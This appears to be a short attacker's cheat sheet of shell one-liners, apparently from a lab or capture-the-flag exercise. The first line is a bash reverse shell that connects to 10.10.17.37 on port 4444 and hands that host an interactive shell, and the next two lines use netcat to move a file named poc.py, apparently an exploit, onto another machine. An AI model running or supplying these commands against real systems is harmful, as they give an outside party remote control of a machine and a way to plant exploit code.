bash -i >& /dev/tcp/10.10.17.37/4444 0>&1

nc -lp 9999 > poc.py
nc $destip < poc.py